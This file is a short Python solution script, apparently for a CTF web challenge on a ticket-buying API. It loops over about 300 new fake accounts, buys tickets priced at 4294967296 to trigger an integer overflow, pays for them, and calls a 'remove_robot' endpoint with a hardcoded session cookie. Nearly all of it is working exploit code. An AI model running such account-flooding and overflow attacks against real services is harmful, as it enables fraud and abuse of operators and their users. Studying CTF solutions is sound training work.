import requests
import json

for i in range(900,1200):
	#register 
	url_regester='http://117.51.147.155:5050/ctf/api/register?name=oswordxx'+str(i)+'&password=123456789'
	r1=requests.session()
	rep=r1.get(url=url_regester)
	print(url_regester)
	url_login='http://117.51.147.155:5050/ctf/api/login?name=oswordxx'+str(i)+'&password=123456789'
	r2=requests.session()
	r2_rep=r2.get(url=url_login)
	# check login
	if "200" in r2_rep.text:
		# buy ticket
		print("[+]sucessfully login: "+"username=oswordxx"+str(i))
		url_getbill='http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967296'
		r3=r2.get(url=url_getbill)
		json3=r3.json()
		json_data=json3["data"]
		# get bill_id
		bill_id=json_data[0]["bill_id"]
		print("[-]bill_id: "+str(bill_id))
		url_spand="http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id="+bill_id
		r4=r2.get(url=url_spand)
		json4=r4.json()
		print(json4)
		# get id and hash_val
		hash_cal=json4['data'][0]['your_ticket']
		id1=json4['data'][0]['your_id']

		#remove_robot
		#http://117.51.147.155:5050/index.html#/main/result
		url_remove='http://117.51.147.155:5050/ctf/api/remove_robot?id='+str(id1)+'&ticket='+str(hash_cal)
		cookies={
			'user_name':'osword','REVEL_SESSION':'11561598e756e3dd21e13814c9bc6056'
		}
				
		rmain_rep=requests.get(url=url_remove,cookies=cookies)
		if "200" in rmain_rep.text:
			print(rmain_rep.text)
			print("remove sucessfully")
			continue





